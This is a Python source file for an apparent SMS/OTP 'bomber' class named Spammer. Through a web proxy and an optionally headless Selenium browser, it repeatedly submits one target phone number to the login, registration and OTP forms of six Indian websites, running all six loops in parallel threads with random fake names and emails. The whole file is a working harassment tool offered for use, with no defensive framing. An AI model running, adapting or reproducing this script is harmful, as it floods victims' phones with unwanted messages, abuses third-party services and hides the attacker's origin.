from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os
import time
import random
import string
from threading import Thread


class Spammer:

    chrome_options = Options()
    path = os.getcwd() + r"\\chromedriver.exe"

    def __init__(self, mobile, count, seconds, headless=False):
        self.mobile_no = mobile
        self.bomb_count = int(count)
        self.spam_count = 0
        self.delay = float(seconds)
        if headless:
            Spammer.chrome_options.add_argument("--headless")

    def create_driver(self, url):
        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
        driver.get("https://us.hideproxy.me/")

        self.remove_options(driver)

        url_input = driver.find_element_by_class_name("url-input")
        url_input.clear()
        url_input.send_keys(url)

        url_button = driver.find_element_by_class_name("url-button")
        driver.execute_script("arguments[0].click();", url_button)

        return driver

    def remove_options(self, driver):
        remove_scripts = driver.find_element_by_id("stripJS")
        if remove_scripts.get_attribute('checked'):
            driver.execute_script("arguments[0].click();", remove_scripts)

        remove_objects = driver.find_element_by_id("stripObjects")
        if remove_objects.get_attribute('checked'):
            driver.execute_script("arguments[0].click();", remove_objects)

        
    def redbus_blast(self):
        driver = self.create_driver("https://www.redbus.in/account")

        print("Spamming...")
        i = 0
        try:
            while self.spam_count < self.bomb_count:

                country_code = driver.find_element_by_id("selectedPhCode")
                driver.execute_script("arguments[0].setAttribute('data-cntrycode','IND')", country_code)
                driver.execute_script("arguments[0].innerHTML = arguments[1];", country_code, "+ 91")

                mobile_input = driver.find_element_by_id("mobileNoInp")
                mobile_input.clear()
                mobile_input.send_keys(self.mobile_no)

                element = driver.find_element_by_class_name("otpContainer")
                driver.execute_script("arguments[0].click();", element)

                element = driver.find_element_by_class_name("resendOtpContainer")
                driver.execute_script("arguments[0].click();", element)

                driver.refresh()
                self.remove_options(driver)

                self.spam_count += 1
                i += 1

                time.sleep(self.delay)

        except Exception as e:
            print(e)

        finally:
            print(i)
            driver.close()

    def hike_blast(self):
        driver = self.create_driver("https://hike.in/")

        i = 0
        try:
            while self.spam_count < self.bomb_count:
                mobile_input = driver.find_element_by_id("number-input")
                mobile_input.clear()
                mobile_input.send_keys(self.mobile_no)

                button = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
                driver.execute_script("arguments[0].click();", button)

                driver.refresh()
                self.spam_count += 1
                i += 1
                time.sleep(self.delay)

        except Exception as e:
            print(e)

        finally:
            print(i)
            driver.close()

    def biryani_blast(self):
        driver = self.create_driver("https://www.behrouzbiryani.com/bb-login")

        random_string = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))
        name = random_string
        email = random_string + "@ggwp.xxx"

        i = 0
        try:
            while self.spam_count < self.bomb_count:
                mobile_input = driver.find_element_by_id("mobileno")
                mobile_input.clear()
                mobile_input.send_keys(self.mobile_no)

                name_input = driver.find_element_by_id("customer_name")
                name_input.clear()
                name_input.send_keys(name)

                email_input = driver.find_element_by_id("email_id")
                email_input.clear()
                email_input.send_keys(email)

                button = driver.find_element_by_id("send_otp_register")
                driver.execute_script("arguments[0].click();", button)

                driver.refresh()
                self.spam_count += 1
                i += 1

                time.sleep(self.delay)

        except Exception as e:
            print(e)

        finally:
            print(i)
            driver.close()

    def yatra_blast(self):
        driver = self.create_driver("https://secure.yatra.com/social/common/yatra/register")

        i = 0
        try:
            while self.spam_count < self.bomb_count:
                mobile_input = driver.find_element_by_id("login-input")
                mobile_input.clear()
                mobile_input.send_keys(self.mobile_no)

                button = driver.find_element_by_id("login-continue-btn")
                driver.execute_script("arguments[0].click();", button)

                driver.refresh()
                self.spam_count += 1
                i += 1

                time.sleep(self.delay)
        except Exception as e:
            print(e)

        finally:
            print(i)
            driver.close()

    def treebo_blast(self):
        driver = self.create_driver("https://www.treebo.com/login/")

        i = 0
        try:
            while self.spam_count < self.bomb_count:
                mobile_input = driver.find_element_by_id("mobile")
                mobile_input.clear()
                mobile_input.send_keys(self.mobile_no)

                button = driver.find_element_by_id("verify")
                driver.execute_script("arguments[0].click();", button)

                driver.refresh()
                self.spam_count += 1
                i += 1

                time.sleep(self.delay)

        except Exception as e:
            print(e)

        finally:
            print(i)
            driver.close()

    def joister_blast(self):
        driver = self.create_driver("https://www.joister.com/")

        i = 0
        try:
            while self.spam_count < self.bomb_count:
                button = driver.find_element_by_id("sign_up")
                driver.execute_script("arguments[0].click();", button)

                random_string1 = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))
                random_string2 = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))

                name_input = driver.find_element_by_id("first_name")
                name_input.clear()
                name_input.send_keys(random_string1)

                name_input = driver.find_element_by_id("last_name")
                name_input.clear()
                name_input.send_keys(random_string2)

                mobile_input = driver.find_element_by_id("mobile_number")
                mobile_input.clear()
                mobile_input.send_keys(self.mobile_no)

                button = driver.find_element_by_id("next-step-btn")
                driver.execute_script("arguments[0].click();", button)

                driver.refresh()
                self.spam_count += 1
                i += 1

                time.sleep(self.delay)

        except Exception as e:
            print(e)

        finally:
            print(i)
            driver.close()

    def spam(self):

        t1 = Thread(target=self.hike_blast, args=[])
        t2 = Thread(target=self.redbus_blast, args=[])
        t3 = Thread(target=self.biryani_blast, args=[])
        t4 = Thread(target=self.yatra_blast, args=[])
        t5 = Thread(target=self.treebo_blast, args=[])
        t6 = Thread(target=self.joister_blast, args=[])

        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()
        t6.start()
